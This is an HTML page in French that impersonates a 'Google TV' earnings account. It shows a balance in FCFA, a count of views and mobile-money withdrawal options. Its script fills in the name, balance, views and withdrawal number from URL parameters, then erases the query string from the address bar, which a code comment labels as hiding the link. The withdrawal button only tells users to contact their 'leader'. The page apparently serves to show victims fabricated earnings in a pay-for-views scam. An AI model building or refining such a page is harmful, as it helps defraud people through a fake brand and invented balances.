<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Compte</title>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#0d1b2a;
  color:white;
  padding:15px;
}

h2{
  margin-bottom:15px;
}

.green-box{
  background:linear-gradient(45deg,#1db954,#3ddc84);
  padding:20px;
  border-radius:20px;
  margin-bottom:15px;
}

.green-box p{
  margin:0;
  opacity:0.9;
}

.green-box h1{
  margin:10px 0 0;
  font-size:28px;
}

.info{
  background:#1b263b;
  padding:15px;
  border-radius:15px;
  text-align:center;
  margin-bottom:15px;
  color:#3ddc84;
}

.grid{
  display:flex;
  gap:10px;
}

.card{
  flex:1;
  background:#1b263b;
  padding:15px;
  border-radius:15px;
}

.btn{
  margin-top:15px;
  background:#1abc9c;
  padding:15px;
  text-align:center;
  border-radius:15px;
  font-weight:bold;
  cursor:pointer;
}

.section{
  margin-top:20px;
}

.methods{
  display:flex;
  gap:10px;
  flex-wrap:wrap;
}

.method{
  background:#2c3e50;
  padding:10px 15px;
  border-radius:10px;
}
</style>
</head>

<body>

<h2>Bonjour, <span id="nom">Client</span></h2>

<div class="green-box">
  <p>Montant disponible</p>
  <h1 id="solde">0 FCFA</h1>
</div>

<div class="info">
  Bienvenue sur votre compte Google TV,<br>
  vos retraits sont directement validés sur votre numéro de retrait ✅
</div>

<div class="grid">
  <div class="card">
    <p>Vues comptées</p>
    <h2 id="vues">0 vues</h2>
  </div>

  <div class="card">
    <p>Numéro retrait</p>
    <h2 id="numero">00000000</h2>
  </div>
</div>

<div class="btn" onclick="alert('Contactez votre leader pour valider le retrait')">
💸 Demander un retrait
</div>

<div class="section">
  <h3>Choisir votre mode de retrait</h3>

  <div class="methods">
    <div class="method">Wave</div>
    <div class="method">Tmoney</div>
    <div class="method">Orange</div>
    <div class="method">MTN</div>
    <div class="method">Moov</div>
  </div>
</div>

<script>
// 🔥 PARAMÈTRES DU LIEN
const params = new URLSearchParams(window.location.search);

// Appliquer valeurs
document.getElementById("nom").textContent =
  params.get("nom") || "Client";

document.getElementById("solde").textContent =
  (params.get("solde") || "0") + " FCFA";

document.getElementById("numero").textContent =
  params.get("numero") || "00000000";

document.getElementById("vues").textContent =
  (params.get("vues") || "0") + " vues";

// 🔥 CACHER LE LIEN
if (window.location.search) {
  window.history.replaceState({}, document.title, window.location.pathname);
}
</script>

</body>
</html>
